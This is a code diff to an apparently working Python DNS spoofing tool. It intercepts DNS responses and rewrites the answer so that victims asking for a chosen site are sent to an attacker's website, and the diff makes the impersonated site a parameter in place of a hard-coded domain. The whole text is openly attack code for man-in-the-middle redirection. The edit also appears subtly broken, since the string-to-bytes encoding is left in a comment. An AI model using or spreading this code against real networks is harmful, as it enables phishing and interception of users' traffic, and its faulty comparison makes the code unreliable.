@@ -14,9 +14,9 @@ global list_of_dns
 # class that houses dns spoofing code
 class DnsSpoofing:
     # initializes the desired website for the victim to be redirected to
-    def __init__(self, attacker_website_redirect):
+    def __init__(self, attacker_website_redirect, site_to_impersonate):
         self.attacker_website_redirect = attacker_website_redirect
-        self.dns_get_websites = {b"hatzwebsite.com.": attacker_website_redirect}
+        self.site_to_impersonate = site_to_impersonate # {site_to_impersonate.encode()}
 
     # callback that processes each packet that is forwarded by the attacker
     def process_dns(self, packet):
@@ -26,16 +26,15 @@ class DnsSpoofing:
             try:
                 my_packet = self.modify(my_packet)
             except IndexError:
-                # not UDP packet, this can be IPerror/UDPerror packets
                 pass
-            if my_packet[DNS].an.rrname in self.dns_get_websites:
+            if my_packet[DNS].an.rrname == self.site_to_impersonate:
                 packet.set_payload(bytes(my_packet))
 
         packet.accept()
 
     # modify the desired dns response packets
     def modify(self, packet):
-        if packet[DNSQR].qname in self.dns_get_websites:
+        if packet[DNSQR].qname == self.site_to_impersonate:
 
             packet[DNS].an = DNSRR()
             packet[DNS].an.rrname = packet[DNSQR].qname
